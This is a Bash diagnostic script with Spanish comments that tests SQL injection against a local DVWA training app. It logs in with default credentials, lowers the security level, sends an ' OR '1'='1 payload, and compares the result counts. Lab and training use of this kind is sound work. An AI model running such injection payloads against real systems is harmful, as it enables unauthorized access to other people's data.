#!/bin/bash
#
# debug-sqli-v2.sh - Diagnóstico mejorado con seguimiento de redirects
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/utils.sh"

TARGET_URL="http://localhost:80"

echo "🔍 DIAGNÓSTICO SQL INJECTION v2"
echo "================================"
echo ""

# Obtener sesión siguiendo redirects
echo "[1] Login en DVWA (siguiendo redirects)..."
LOGIN_RESPONSE=$(curl -s -L -c /tmp/dvwa_cookies.txt \
    -d "username=admin&password=password&Login=Login" \
    "$TARGET_URL/login.php")

DVWA_SESSION=$(grep PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $7}')
echo "    Sesión: $DVWA_SESSION"
echo ""

# Verificar login exitoso
echo "[2] Verificando login exitoso..."
INDEX_RESPONSE=$(curl -s -L -b /tmp/dvwa_cookies.txt "$TARGET_URL/index.php")
if echo "$INDEX_RESPONSE" | grep -q "Logout"; then
    echo "    ✓ Login exitoso"
else
    echo "    ✗ Login falló"
    echo "$INDEX_RESPONSE" | head -20
fi
echo ""

# Configurar nivel de seguridad
echo "[3] Configurando nivel de seguridad a low..."
SECURITY_RESPONSE=$(curl -s -L -b /tmp/dvwa_cookies.txt \
    -d "security=low&seclev_submit=Submit" \
    "$TARGET_URL/security.php")
echo "    ✓ Enviado"
echo ""

# Verificar nivel de seguridad
echo "[4] Verificando nivel de seguridad..."
SECURITY_CHECK=$(curl -s -L -b /tmp/dvwa_cookies.txt "$TARGET_URL/security.php")
if echo "$SECURITY_CHECK" | grep -q 'selected.*low\|low.*selected'; then
    echo "    ✓ Nivel es low"
else
    echo "    ⚠ No se pudo confirmar nivel low"
fi
echo ""

# Acceder a página SQL Injection
echo "[5] Accediendo a página SQL Injection..."
SQLI_PAGE=$(curl -s -L -b /tmp/dvwa_cookies.txt "$TARGET_URL/vulnerabilities/sqli/")
echo "    Longitud respuesta: $(echo "$SQLI_PAGE" | wc -c) bytes"

# Verificar que estamos en la página correcta
if echo "$SQLI_PAGE" | grep -qi "SQL Injection"; then
    echo "    ✓ Estamos en la página SQL Injection"
else
    echo "    ✗ No estamos en la página SQL Injection"
fi

# Buscar el formulario
if echo "$SQLI_PAGE" | grep -qi "user id"; then
    echo "    ✓ Formulario encontrado"
else
    echo "    ⚠ Formulario no encontrado"
fi
echo ""

# Test con id=1 (normal)
echo "[6] Test query normal (id=1)..."
NORMAL_URL="$TARGET_URL/vulnerabilities/sqli/?id=1&Submit=Submit"
NORMAL_RESPONSE=$(curl -s -L -b /tmp/dvwa_cookies.txt "$NORMAL_URL")

echo "    URL: $NORMAL_URL"
echo "    Longitud: $(echo "$NORMAL_RESPONSE" | wc -c) bytes"
echo ""
echo "--- Primeras 100 líneas de la respuesta ---"
echo "$NORMAL_RESPONSE" | head -100
echo ""

# Guardar
echo "$NORMAL_RESPONSE" > /tmp/dvwa_normal_v2.html

# Test SQL Injection
echo "[7] Test SQL Injection (id=1' OR '1'='1)..."
SQLI_URL="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit"
SQLI_RESPONSE=$(curl -s -L -b /tmp/dvwa_cookies.txt "$SQLI_URL")

echo "    URL: $SQLI_URL"
echo "    Longitud: $(echo "$SQLI_RESPONSE" | wc -c) bytes"
echo ""
echo "--- Primeras 100 líneas de la respuesta ---"
echo "$SQLI_RESPONSE" | head -100
echo ""

# Guardar
echo "$SQLI_RESPONSE" > /tmp/dvwa_sqli_v2.html

# Buscar diferentes patrones
echo "[8] Buscando patrones en respuesta normal..."
echo "    - ID:"
echo "$NORMAL_RESPONSE" | grep -i "ID:" || echo "      No encontrado"
echo "    - First name:"
echo "$NORMAL_RESPONSE" | grep -i "First name:" || echo "      No encontrado"
echo "    - Surname:"
echo "$NORMAL_RESPONSE" | grep -i "Surname:" || echo "      No encontrado"
echo ""

echo "[9] Comparando cantidad de resultados..."
NORMAL_LINES=$(echo "$NORMAL_RESPONSE" | grep -i "first name" | wc -l)
SQLI_LINES=$(echo "$SQLI_RESPONSE" | grep -i "first name" | wc -l)
echo "    Normal: $NORMAL_LINES resultados"
echo "    SQLi:   $SQLI_LINES resultados"

if [ "$SQLI_LINES" -gt "$NORMAL_LINES" ]; then
    echo "    ✓ SQL Injection funciona! (más resultados con payload)"
else
    echo "    ✗ SQL Injection no detectada"
fi
echo ""

echo "================================"
echo "✓ Diagnóstico completado"
echo ""
echo "Archivos guardados:"
echo "  /tmp/dvwa_normal_v2.html"
echo "  /tmp/dvwa_sqli_v2.html"
echo ""
echo "Cookies en:"
echo "  /tmp/dvwa_cookies.txt"
